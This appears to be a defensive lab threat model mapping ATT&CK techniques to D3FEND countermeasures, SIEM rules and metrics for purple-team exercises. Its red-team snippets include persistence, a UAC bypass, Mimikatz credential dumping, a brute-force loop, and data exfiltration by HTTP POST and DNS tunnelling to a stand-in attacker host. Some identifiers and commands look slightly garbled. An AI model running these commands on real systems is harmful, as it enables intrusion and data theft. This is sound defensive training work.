# HoneyPod Threat Model & Lab Exercise Matrix
# Maps MITRE ATT&CK Techniques → D3FEND Countermeasures → Lab Scenarios → Success Metrics

## Overview

This threat model defines:
1. **What adversary behaviors we want to emulate** (MITRE ATT&CK)
2. **How we defend against them** (MITRE D3FEND)
3. **What exercises validate each technique** (Lab Scenarios)
4. **How we measure success** (Metrics)

---

## Initial Access (TA0001)

### T1566: Phishing

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1566 |
| **Subtechniques** | T1566.001 (Email), T1566.002 (Spearphishing), T1566.003 (Link), T1566.004 (Attachment) |
| **Description** | Adversary sends phishing emails with malicious links/attachments to gain initial access |

**D3FEND Countermeasures:**
- **DA-0003:** Email Analysis → Content inspection, URL extraction, sender verification
- **DA-0004:** Domain Analysis → Domain reputation, registration history
- **DA-0005:** Process Analysis → Behavioral analysis of spawned processes

**Lab Emulation:**
- **Scenario:** EXEC-002-T1566-Phishing
- **Red Team:** Send phishing email to endpoints, embedded payload links
- **Blue Team:** Detect via email gateway logs, URL inspection, process execution alerts
- **Expected Detection:** Alert on suspicious email + attachment analysis + process exec correlation
- **Success Criteria:** Detect phishing within 5 minutes of user clicking link

**SIEM Rules:**
- `email-malicious-attachment-detected`
- `process-spawned-from-email-client`
- `macro-execution-from-office`
- `suspicious-url-click-detected`

**D3FEND Techniques Exercised:**
- DA-0003 Email Analysis: Inspect email body, attachments, metadata
- DA-0005 Process Analysis: Detect Office macro execution, child process tree
- DA-0014 Firmware Analysis: If email client updatesexecuted

---

### T1566.002: Spearphishing (Populated with Internal Intelligence)

**Lab Enhancement:** Use scraped internal data (names, titles, projects from AD) to increase realism.

**Phishing Content Example:**
```
From: finance@corp.local
Subject: Q1 Expense Report - Action Required

Hi Alice,

Can you please review and approve the Q1 expense report for the IT department?
Click here to access the report: [link to malicious payload]

Thanks,
Carol (Finance Manager)
```

**Blue Team Detection Indicators:**
- Email originated from external IP (spoofed domain)
- Sender address doesn't match sender display name
- Suspicious attachment MIME type
- Embedded macro in Office document
- Process tree: Outlook.exe → cmd.exe (unusual)

---

## Execution (TA0002)

### T1059: Command and Scripting Interpreter

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1059 |
| **Subtechniques** | T1059.001 (PowerShell), T1059.003 (Windows Command Shell), T1059.006 (Python), T1059.007 (JavaScript) |

**D3FEND Countermeasures:**
- **DA-0005:** Process Analysis → Command-line arguments, parent-child relationships
- **DA-0008:** Execution Behavior Analysis → Memory analysis, API hooking
- **DA-0013:** System Configuration Analysis → Execution policy, script logging

**Lab Emulation:**
- **Scenario:** EXEC-003-T1059-Command-Execution
- **Red Team:** Execute PowerShell commands via Caldera agent
  ```powershell
  Get-ADUser -Filter * | Export-Csv -Path C:\temp\ad-dump.csv
  ```
- **Blue Team:** Alert on PowerShell process with suspicious arguments
- **Expected Detection:** Sysmon Event 1 (process creation) with PowerShell + Get-ADUser
- **Success Criteria:** Detect within 30 seconds

**SIEM Rules:**
- `powershell-scriptblock-logging-suspicious`
- `command-line-obfuscation-detected`
- `ad-enum-command-detected`

**D3FEND Techniques Exercised:**
- DA-0005 Process Analysis: Capture full command line, parent process
- DA-0013 System Configuration Analysis: Check PowerShell execution policy
- DA-0008 Execution Behavior Analysis: Memory scan for shellcode

---

### T1047: Windows Management Instrumentation Command Execution

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1047 |
| **Description** | Use WMI to execute commands, often living-off-the-land (LOLBin) technique |

**Lab Emulation:**
- **Scenario:** EXEC-004-T1047-WMI-Exec
- **Red Team:** Execute WMI command
  ```powershell
  wmic process call create "cmd.exe /c powershell -enc <Base64Payload>"
  ```
- **Blue Team:** Detect WMI parent process, unusual child process
- **Expected Detection:** Sysmon Event 1: Parent=wmiPrvSE.exe, Child=cmd.exe
- **Success Criteria:** Alert on command length > 200 chars (encoded payload), parent=WMI

---

## Persistence (TA0003)

### T1547: Boot or Logon Autostart Execution

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1547 |
| **Subtechniques** | T1547.001 (Registry Run Keys), T1547.004 (Logon Scripts), T1547.005 (Security Support Provider) |

**D3FEND Countermeasures:**
- **DA-0010:** File Analysis → Monitor file creation in autorun directories
- **DA-0013:** System Configuration Analysis → Registry monitoring
- **DA-0020:** Scheduled Job Analysis → Scheduled task monitoring

**Lab Emulation:**
- **Scenario:** EXEC-001 (Phase 2) - T1547 Registry Run Key
- **Red Team:** Modify registry to persist beacon
  ```powershell
  Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "svc_monitor" -Value "C:\Windows\Temp\beacon.exe"
  ```
- **Blue Team:** Alert on registry modification by non-system process
- **Expected Detection:** Sysmon Event 12/13 (registry modification), alerting on HKLM\...\Run writes
- **Success Criteria:** Alert within 30 seconds

**SIEM Rules:**
- `suspicious-registry-run-key-modification`
- `registry-write-by-non-system-process`
- `persistence-mechanism-detected`

---

### T1543: Create or Modify System Process

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1543 |
| **Subtechniques** | T1543.003 (Windows Service), T1543.004 (Launchd - macOS), T1543.005 (systemd - Linux) |

**Lab Emulation - Windows Service (T1543.003):**
- **Red Team:** Create malicious Windows service
  ```powershell
  New-Service -Name "SystemMonitor" -BinaryPathName "C:\Windows\Temp\beacon.exe" -StartupType Automatic
  ```
- **Blue Team:** Alert on service creation with suspicious binary path
- **Expected Detection:** Windows Event 4697 (Service created)
- **Success Criteria:** Alert on service with .exe in temp directory

**Lab Emulation - systemd (T1543.005 - Linux Lab):**
- **Red Team:** Create malicious systemd unit
  ```bash
  cat > /etc/systemd/system/network-monitor.service <<EOF
  [Unit]
  Description=Network Monitoring Service
  [Service]
  ExecStart=/home/attacker/.cache/beacon
  Type=simple
  EOF
  systemctl daemon-reload
  systemctl enable network-monitor
  ```
- **Blue Team:** Alert on unauthorized systemd unit creation
- **Expected Detection:** auditd rule on /etc/systemd/system/ writes
- **Success Criteria:** Alert on suspicious binary in .cache directory

---

## Privilege Escalation (TA0004)

### T1548: Abuse Elevation Control Mechanism

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1548 |
| **Subtechniques** | T1548.002 (Bypass User Access Control), T1548.003 (Sudo/Sudo Caching) |

**D3FEND Countermeasures:**
- **DA-0009:** Privilege Level Monitoring → Track privilege changes
- **DA-0001:** Adversary Behavior Analysis → Detect common UAC bypass patterns

**Lab Emulation - UAC Bypass (T1548.002):**
- **Red Team:** Execute UAC bypass (e.g., fodhelper.exe trick)
  ```powershell
  # Create registry key for com hijacking
  REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
  # Execute fodhelper.exe (auto-elevates due to hijacked COM handler)
  C:\Windows\System32\fodhelper.exe
  ```
- **Blue Team:** Detect characteristic registry modifications + fodhelper spawn
- **Expected Detection:** Sysmon Event 12 (registry) + Event 1 (fodhelper process)
- **Success Criteria:** Chain detection of fodhelper + registry modification in HKCU\Classes\ms-settings

---

## Defense Evasion (TA0005)

### T1140: Deobfuscate/Decode Files or Information

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1140 |
| **Description** | Decode/decompress files to avoid detection (e.g., Base64, gzip, encrypted payloads) |

**Lab Emulation:**
- **Red Team:** Deliver Base64-encoded PowerShell payload
  ```powershell
  # Payload: Get-Process | Out-File C:\temp\procs.txt
  # Encoded:
  powershell -EncodedCommand "R2V0LVByb2Nlc3MgfCBPdXQtRmlsZSBDOlx0ZW1wXHByb2NzLnR4dAo="
  ```
- **Blue Team:** Log base64 decoding, detect encoded command execution
- **Expected Detection:** PowerShell script block logging or command-line alert on `-EncodedCommand`
- **Success Criteria:** SIEM correlates encoded command execution with suspicious process tree

---

### T1036: Masquerading

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1036 |
| **Subtechniques** | T1036.003 (Rename System Utilities), T1036.005 (Match Legitimate Name or Location) |

**Lab Emulation:**
- **Red Team:** Rename beacon to appear as system process
  ```bash
  cp /home/attacker/beacon.elf /usr/local/sbin/systemd-resolver
  ```
- **Blue Team:** Alert on binary signature mismatch, file modification in system directories
- **Expected Detection:** File hash doesn't match known system binary
- **Success Criteria:** Alert on unsigned binary in system directory or hash mismatch on known system file

---

## Credential Access (TA0006)

### T1110: Brute Force

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1110 |
| **Subtechniques** | T1110.001 (Password Guessing), T1110.004 (Credential Stuffing) |

**Lab Emulation:**
- **Scenario:** EXEC-001 (Phase 1) - T1110 Brute Force
- **Red Team:** Launch brute force against DMZ jump host
  ```bash
  for pass in "P@ssw0rd!" "Welcome123!" "Company2024!" "Admin123!"; do
    sshpass -p "$pass" sshpass ssh -o ConnectTimeout=2 admin@192.168.30.100 &
  done
  ```
- **Blue Team:** Detect multiple failed login attempts
- **Expected Detection:** Windows Event 4625 (failed login) aggregated by source IP + user
- **Success Criteria:** Alert on >5 failed attempts in 5 minutes

**SIEM Rule:**
```elasticsearch
{
  "aggregation": "count",
  "group_by": ["source_ip", "user"],
  "time_window": "5m",
  "threshold": 5,
  "event_ids": [4625],
  "alert_name": "Brute Force Attempt"
}
```

---

### T1003: OS Credential Dumping

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1003 |
| **Subtechniques** | T1003.001 (LSASS Memory), T1003.002 (SAM Registry), T1003.005 (Cachedomain Credentials) |

**Lab Emulation:**
- **Scenario:** EXEC-005-T1003-Credential-Dump
- **Red Team:** Use Mimikatz to dump credentials from LSASS
  ```powershell
  # Via Caldera agent
  mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
  ```
- **Blue Team:** Alert on Mimikatz tool, LSASS access, suspicious process behavior
- **Expected Detection:** 
  - Process name matches known credential dumping tools
  - Sysmon Event 10 (ProcessAccess): target=lsass.exe
  - Suspicious parent process (powershell.exe accessing lsass)
- **Success Criteria:** Multi-factor detection: tool detection + LSASS access correlation

---

## Discovery (TA0007)

### T1087: Account Discovery

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1087 |
| **Description** | Enumerate user accounts, groups, domain info via directory queries |

**Lab Emulation:**
- **Scenario:** EXEC-006-T1087-Account-Discovery
- **Red Team:** Execute AD enumeration
  ```powershell
  Get-ADUser -Filter * -Properties * | Select samAccountName, mail | Export-Csv ad-users.csv
  Get-ADGroup -Filter * | Select name
  Get-ADComputer -Filter * | Select name, operatingSystem
  ```
- **Blue Team:** Alert on elevated query volume to AD, unusual attributes accessed
- **Expected Detection:** Sysmon Event 3 (network connection) anomaly, high Azure AD query rate
- **Success Criteria:** Alert on >50 LDAP queries from single process within 1 minute

---

### T1040: Network Sniffing

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1040 |
| **Description** | Use packet capture tools (tcpdump, Wireshark) to sniff network traffic |

**Lab Emulation:**
- **Red Team:** Launch packet capture on compromised endpoint
  ```bash
  tcpdump -i eth0 -w capture.pcap host 192.168.20.0/24
  ```
- **Blue Team:** Alert on packet capture tool execution
- **Expected Detection:** Process name in [tcpdump, windump, dumpcap], file creation in suspicious location
- **Success Criteria:** Alert within 30 seconds of process start

---

## Lateral Movement (TA0008)

### T1021: Remote Services

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1021 |
| **Subtechniques** | T1021.001 (RDP), T1021.002 (SSH), T1021.004 (SSH/SCP), T1021.006 (Windows Remote Management) |

**Lab Emulation - RDP (T1021.001):**
- **Scenario:** EXEC-001 (Phase 3) - T1021.006 RDP Lateral Movement
- **Red Team:** Lateral move via RDP with valid compromised credentials
  ```
  xfreerdp /u:svc_backup /p:Password123! /v:192.168.20.100:3389
  ```
- **Blue Team:** Alert on RDP logon from unexpected source
- **Expected Detection:** Windows Event 4624 (logon type 10 = RDP) + source network segmentation violation
- **Success Criteria:** Chain alert: RDP logon + zone violation

**Lab Emulation - SSH (T1021.002/T1021.004):**
- **Red Team:** Lateral move within Linux infrastructure
  ```bash
  ssh -i /tmp/id_rsa svc_app@192.168.20.50
  ```
- **Blue Team:** Alert on SSH key usage, brute force, or unusual source
- **Expected Detection:** Auditd rule on SSH authentication, unusual source IP
- **Success Criteria:** Alert on SSH from endpoint zone to server zone

---

### T1570: Lateral Tool Transfer

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1570 |
| **Description** | Transfer tools over network for execution on other systems |

**Lab Emulation:**
- **Red Team:** Copy beacon to file server via SMB
  ```powershell
  Copy-Item -Path C:\beacon.exe -Destination \\srv-fs-01\tools\beacon.exe
  ```
- **Blue Team:** Alert on unusual file copy to admin/system shares
- **Expected Detection:** Sysmon Event 11 (file creation) + SMB path, alert on .exe in shares
- **Success Criteria:** Alert on binary copied to network share

---

## Collection (TA0009)

### T1123: Audio Capture

### T1115: Clipboard Data

### T1005: Data from Local System

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1005, T1115, T1123 |
| **Description** | Collect data from victim systems (files, clipboard, audio) |

**Lab Emulation:**
- **Red Team:** Collect sensitive documents
  ```powershell
  Get-ChildItem -Path C:\Users\*\Documents -Filter *.xlsx -Recurse | Copy-Item -Destination C:\temp\exfil\
  ```
- **Blue Team:** Alert on bulk file access from unusual process
- **Expected Detection:** File access pattern anomaly, data volume threshold exceeded
- **Success Criteria:** Alert on >100 file reads in 1 minute

---

## Exfiltration (TA0010)

### T1020: Automated Exfiltration

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1020 |
| **Description** | Automatically exfiltrate data via network protocol |

**Lab Emulation:**
- **Scenario:** EXEC-001 (Phase 4) - T1020 Exfiltration
- **Red Team:** HTTP POST sensitive data to external C2
  ```powershell
  $data = Get-Content C:\temp\sensitive.csv -Encoding Byte
  Invoke-WebRequest -Uri "https://attacker.external.com/upload" -Method POST -Body $data
  ```
- **Blue Team:** Alert on large outbound HTTPS transfer
- **Expected Detection:** Firewall log: outbound HTTPS, unusual destination, >1 MB in <1 min
- **Success Criteria:** NSM (Suricata/Zeek) detects suspicious pattern

### T1041: Exfiltrate via C2

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1041 |
| **Description** | Exfiltrate via established command & control channel |

**Lab Emulation:**
- **Red Team:** C2 beacon maintains persistent tunnel;data flows over encrypted channel
- **Blue Team:** Detect via anomalous outbound traffic patterns, DNS tunneling, unusual protocols
- **Expected Detection:** Threat intel lookup on external IP, ASN/GeoIP anomaly
- **Success Criteria:** Alert on known C2 IP or pattern of suspicious exfiltration

---

## Impact (TA0040)

### T1531: Account Access Removal

### T1561: Disk Wipe

### T1491: Defacement

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1531, T1561, T1491 |
| **Description** | Disruptive actions: remove access, wipe disks, deface content |

**Lab Emulation (Constrained - Safety):**
- **Red Team:** Attempt account lockout (non-destructive simulation)
  ```powershell
  # Simulate: Set-ADUser -Identity alice.smith -Enabled $false
  # Instead: Log the action for detection practice
  ```
- **Blue Team:** Alert on account disable attempts, permission removals
- **Expected Detection:** Azure AD audit log, Windows Event ID 4722 (account enabled/disabled)
- **Success Criteria:** Alert on unauthorized account modification

**Note:** Actual disk wipe or defacement is NOT simulated; detection rules are tested on similar patterns.

---

## Command & Control (TA0011)

### T1071: Application Layer Protocol

| Aspect | Details |
|--------|---------|
| **ATT&CK ID** | T1071 |
| **Subtechniques** | T1071.001 (HTTP/HTTPS), T1071.002 (DNS), T1071.003 (SMB) |

**Lab Emulation - HTTP C2 (T1071.001):**
- **Red Team:** Caldera agent communicates via HTTP POST to C2
  ```
  POST /api/v2/agent/heartbeat HTTP/1.1
  Host: attacker.external.com
  Content-Type: application/json
  {
    "agent_id": "...",
    "facts": [...],
    "status": "active"
  }
  ```
- **Blue Team:** Detect via suspicious HTTP pattern (high frequency, unusual User-Agent, etc.)
- **Expected Detection:** NSM rule on beaconing pattern, IDS signature match
- **Success Criteria:** Alert on suspicious C2 communication pattern

**Lab Emulation - DNS C2 (T1071.002):**
- **Red Team:** Exfiltrate data via DNS queries
  ```bash
  nslookup "$(base64 -w 63 sensitive.txt).attacker.com"
  ```
- **Blue Team:** Detect via DNS pattern analysis
- **Expected Detection:** DNS query anomaly (long subdomain, high QPS, unusual TLD)
- **Success Criteria:** Alert on DNS tunneling pattern

---

## Deception & MITRE Engage Mapping

### MITRE Engage - Expose, Monitor, Deceive

All exercises use the **deception zone** (192.168.40.0/24) with OpenCanary + Cowrie:

| Engagement Tactic | Technique | Lab Implementation |
|-------------------|-----------|-------------------|
| **Expose** | Decoy Services | OpenCanary: FTP, SSH, SMB, HTTP with canary tokens |
| **Monitor** | Telemetry Collection | All honeypot access logged to SIEM, full PCAP of interactions |
| **Deceive** | Fake Credentials | Stored in canary files on shares, tracked on access |
| **Misdirect** | Decoy Hosts | Cowrie SSH honeypot responds to login attempts |
| **Deny** | Cost Imposition | Honeypot engagement tracked, misdirects adversary from real targets |

**Success Metric:** If red team engages honeypot:
- Alert: "Honeypot Engagement Detected"
- Impact: Full packet capture + behavioral analysis
- TTP Inference: What technique was adversary attempting?
- Cost to Adversary: Time spent on decoy (not real target)

---

## Exercise Library (Scenarios & Success Criteria)

| Exercise ID | Title | ATT&CK Techniques | D3FEND Methods | Duration | Blue Team Success |
|---|---|---|---|---|---|
| EXEC-001 | Brute Force → Lateral Movement → Exfil | T1110, T1547, T1021, T1020 | DA-0001, DA-0005 | 45 min | TTD <2 min, MTTR <10 min, 80%+ detection rate |
| EXEC-002 | Phishing + Macro Execution | T1566, T1059, T1140 | DA-0003, DA-0005 | 30 min | Block email or prevent macro within 5 min |
| EXEC-003 | Command Execution + AD Enumeration | T1059, T1087 | DA-0005, DA-0013 | 30 min | Alert on command + detect AD queries |
| EXEC-004 | WMI Persistence + Living-off-the-Land | T1047, T1036, T1547 | DA-0005, DA-0010 | 30 min | Detect LOLBin parent + persistence mechanism |
| EXEC-005 | Credential Dumping (LSASS) | T1003, T1548 | DA-0009, DA-0001 | 20 min | Multi-factor: tool detection + LSASS access |
| EXEC-006 | Network Discovery + Data Collection | T1087, T1040, T1005 | DA-0001, DA-0020 | 30 min | Alert on enumeration + packet capture tool |

---

## Metrics & KPIs

### Per-Exercise Metrics

- **Detection Rate (DR)**: Percentage of ATT&CK techniques detected
- **Time to Detect (TTD)**: Average time from technique execution to alert
- **Time to Respond (TTR)**: Average time from alert to containment action
- **False Positive Rate (FPR)**: Alerts on legitimate activity
- **Technique Coverage**: Number of ATT&CK techniques emulated vs. detected

### Quarterly Trending

```
Q1 2026: EXEC-001
- DR: 67% (T1110 ✓, T1021 ✓, T1020 ✗)
- TTD: 180 sec avg
- TTR: 600 sec avg
- FPR: 3%

Q2 2026: EXEC-001 (Repeated)
- Goal: Improve DR to 85%, TTD to <120 sec
```

### D3FEND Effectiveness

- Which D3FEND techniques are most effective?
- Which are redundant?
- Which have gaps?

---

## References

- MITRE ATT&CK: https://attack.mitre.org
- MITRE D3FEND: https://d3fend.mitre.org
- MITRE Engage: https://engage.mitre.org
- NIST SP 800-115: Technical Security Testing and Assessment
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
